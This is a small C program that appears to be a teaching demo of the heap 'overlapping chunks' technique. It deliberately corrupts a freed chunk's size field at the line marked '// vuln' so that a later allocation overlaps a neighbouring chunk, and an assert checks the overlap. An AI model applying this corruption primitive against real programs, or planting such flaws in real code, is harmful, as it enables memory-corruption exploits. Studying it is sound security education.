#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

int main(int argc , char* argv[])
{
	setbuf(stdout, NULL);

	long *p1,*p2,*p3,*p4;

    p1 = malloc(0x80 - 8);
	p2 = malloc(0x500 - 8);
	p3 = malloc(0x80 - 8);

    memset(p1, '1', 0x80 - 8);
	memset(p2, '2', 0x500 - 8);
	memset(p3, '3', 0x80 - 8);

    int evil_chunk_size = 0x581;
	int evil_region_size = 0x580 - 8;

    *(p2-1) = evil_chunk_size; // vuln

    free(p2);

    p4 = malloc(evil_region_size);

    memset(p4, '4', evil_region_size);
    memset(p3, '3', 80);

    assert(strstr((char *)p4, (char *)p3));
}